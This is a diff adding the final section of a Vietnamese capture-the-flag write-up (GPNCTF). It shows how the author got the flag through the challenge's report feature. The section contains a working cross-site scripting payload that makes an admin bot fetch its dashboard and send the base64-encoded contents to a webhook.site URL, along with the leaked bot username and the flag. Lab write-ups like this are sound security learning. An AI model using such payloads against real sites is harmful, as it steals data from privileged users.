@@ -103,9 +103,43 @@ Sau khi đổi cookie thì ta đã hoàn toàn leo thang lên được quyền m
 ![image](https://github.com/user-attachments/assets/6b6624e3-c57e-4cb2-a2f8-3b9c911d4ba8)
 
 
+Và tôi sẽ bắt đầu tìm hiểu về tính năng report , khi tôi gửi 1 chuỗi bất kì thì nhận lại được là : 
 
+![image](https://github.com/user-attachments/assets/e362ef99-3b2b-4738-9f83-3fbf3176be69)
 
+Và cuối cùng , chúng ta sẽ chèn đoạn payload này vào phần report để dụ cho bot đọc và tiết lộ thông tin cho ta 
+Vì chúng ta biết được bài viết chứa flag nằm ở dashboard của bot
 
+```
+<script>
+fetch('/dashboard')
+  .then(r => r.text())
+  .then(t =>
+    fetch('https://webhook.site/c47162bb-f1c9-4a44-88ce-1703bcdad082', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: btoa(t)
+    })
+  );
+</script>
+```
+Sau khi gửi xong , thì ta nhận được gói tin bắn về webhook như bên dưới , ta đen đoạn base64 này lên cyberchef thì ta được 1 đoạn mã HTML chứa thông tin
 
+ở dashboard và chứa flag.
 
+và ta còn biết được cả username của admin_bot , có thể hữu ích cho các stage sau : 
+
+```
+   >I_am_the_admin_4a65b80fe0c5c3b407f6d3fedd563848fc1d8d0431e3a26af47ecf8ef83bbe5a
+```
+
+![image](https://github.com/user-attachments/assets/65dabc53-8c80-4e70-8b47-d258f5fc0104)
+
+![image](https://github.com/user-attachments/assets/7fe99cbb-ae73-4cba-b7d0-5cf3d8479ce6)
+
+# **FLAG**
+
+```
+GPNCTF{forge_d15_JU1CY_moD}
+```
 
